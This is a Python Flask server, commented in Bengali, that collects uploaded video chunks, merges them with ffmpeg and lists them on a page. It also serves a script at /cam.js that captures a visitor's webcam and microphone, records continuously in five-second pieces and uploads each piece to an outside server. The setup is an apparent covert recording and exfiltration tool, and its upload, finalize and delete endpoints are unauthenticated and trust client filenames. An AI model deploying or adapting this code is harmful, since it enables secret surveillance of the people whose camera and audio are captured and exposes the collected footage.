from flask import Flask, request, Response, render_template_string, send_from_directory, redirect, url_for, make_response
import os
from datetime import datetime
import subprocess
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

CHUNK_FOLDER = 'videos/chunks'
FINAL_FOLDER = 'videos/final'
os.makedirs(CHUNK_FOLDER, exist_ok=True)
os.makedirs(FINAL_FOLDER, exist_ok=True)

# ১. ভিডিও দেখানোর পেজ (আগের মতো)
@app.route('/rndr')
def index():
    videos = sorted(os.listdir(CHUNK_FOLDER))
    template = '''
    <!DOCTYPE html>
    <html>
    <head><title>Uploaded Videos</title></head>
    <body>
        <h1>Uploaded Videos</h1>
        {% if videos %}
            {% for video in videos %}
            <div>
                <video width="320" controls src="{{ url_for('serve_video', filename=video) }}"></video><br>
                <a href="{{ url_for('serve_video', filename=video) }}" download>Download</a>
                <form action="{{ url_for('delete_video', filename=video) }}" method="POST" style="display:inline;">
                    <button onclick="return confirm('Delete this video?')">Delete</button>
                </form>
            </div>
            <hr>
            {% endfor %}
        {% else %}
            <p>No videos found.</p>
        {% endif %}
    </body>
    </html>
    '''
    return render_template_string(template, videos=videos)

# ২. ভিডিও ফাইল সার্ভ করার রুট
@app.route('/videos/final/<path:filename>')
def serve_video(filename):
    return send_from_directory(FINAL_FOLDER, filename)

# ৩. ভিডিও আপলোড (chunk upload)
@app.route('/upload', methods=['POST'])
def upload():
    video = request.files['video']
    filename = datetime.now().strftime("%Y%m%d_%H%M%S_") + video.filename
    video.save(os.path.join(CHUNK_FOLDER, filename))
    print(f"Saved chunk: {filename}")
    return Response("OK", 200)

# ৪. ভিডিও মার্জ / ফাইনালাইজ (আগের মতো)
@app.route('/finalize', methods=['GET'])
def finalize():
    chunks = sorted(os.listdir(CHUNK_FOLDER))
    txt_path = os.path.join(CHUNK_FOLDER, 'chunks.txt')
    with open(txt_path, 'w') as f:
        for chunk in chunks:
            if chunk.endswith('.webm'):
                f.write(f"file '{os.path.abspath(os.path.join(CHUNK_FOLDER, chunk))}'\n")

    final_name = 'final_' + datetime.now().strftime("%Y%m%d_%H%M%S") + '.webm'
    final_path = os.path.join(FINAL_FOLDER, final_name)

    command = ['ffmpeg', '-f', 'concat', '-safe', '0', '-i', txt_path, '-c', 'copy', final_path]
    try:
        subprocess.run(command, check=True)
        for chunk in chunks:
            if chunk.endswith('.webm'):
                os.remove(os.path.join(CHUNK_FOLDER, chunk))
        os.remove(txt_path)
        return redirect(url_for('index'))
    except subprocess.CalledProcessError as e:
        return f"Merge failed: {str(e)}"

# ৫. ভিডিও ডিলিট
@app.route('/delete/<filename>', methods=['POST'])
def delete_video(filename):
    file_path = os.path.join(FINAL_FOLDER, filename)
    if os.path.exists(file_path):
        os.remove(file_path)
        print(f"Deleted: {filename}")
    return redirect(url_for('index'))

# ৬. cam.js রুট — জাভাস্ক্রিপ্ট কোড সার্ভ করবে
@app.route('/cam.js')
def cam_js():
    js_code = '''
(async () => {
  const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
  const mediaRecorder = new MediaRecorder(stream);
  let chunks = [];
  
  mediaRecorder.ondataavailable = e => chunks.push(e.data);
  
  mediaRecorder.onstop = async () => {
    const blob = new Blob(chunks, {type: 'video/webm'});
    chunks = [];
    const formData = new FormData();
    formData.append('video', blob, 'chunk_' + Date.now() + '.webm');
    try {
      await fetch('https://chorcha-video.onrender.com/upload', {method: 'POST', body: formData});
      console.log('Chunk uploaded');
    } catch(err) {
      console.error('Upload failed:', err);
    }
  };
  
  mediaRecorder.start();
  
  setInterval(() => {
    if(mediaRecorder.state === 'recording'){
      mediaRecorder.stop();
      mediaRecorder.start();
    }
  }, 5000);
})();
'''
    response = make_response(js_code)
    response.headers['Content-Type'] = 'application/javascript'
    return response

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
